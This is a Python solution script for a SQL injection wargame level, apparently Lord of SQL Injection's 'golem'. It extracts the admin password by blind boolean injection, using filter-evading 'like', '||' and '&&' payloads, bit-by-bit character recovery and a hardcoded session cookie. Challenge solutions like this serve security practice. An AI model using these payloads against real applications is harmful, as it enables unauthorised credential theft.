import requests

def get(payload):
    return requests.get(
        'https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php',
        params={'pw': payload},
        cookies={'PHPSESSID': 'noefrhpr1bme4kn0b510mjnq01'}).text

# get length
length = 1
while True:
    print("Try length", length)
    if "<h2>Hello admin</h2>" in get(f"'||id like 'admin'&&length(pw) like {length} -- -"):
        break
    length += 1
print("Length is", length)

# get password
password = ''
for index in range(1, length + 1):
    tmp = ''
    for bit in range(1, 8):
        if "<h2>Hello admin</h2>" in get(f"'||id like 'admin'&&mid(lpad(bin(ascii(mid(pw,{index},1))),7,0),{bit},1) -- -"):
           tmp += '1'
        else:
            tmp += '0'
    password += chr(int(tmp, 2))
    print(password)

# password is 77d6290b

# certify
print(get(password))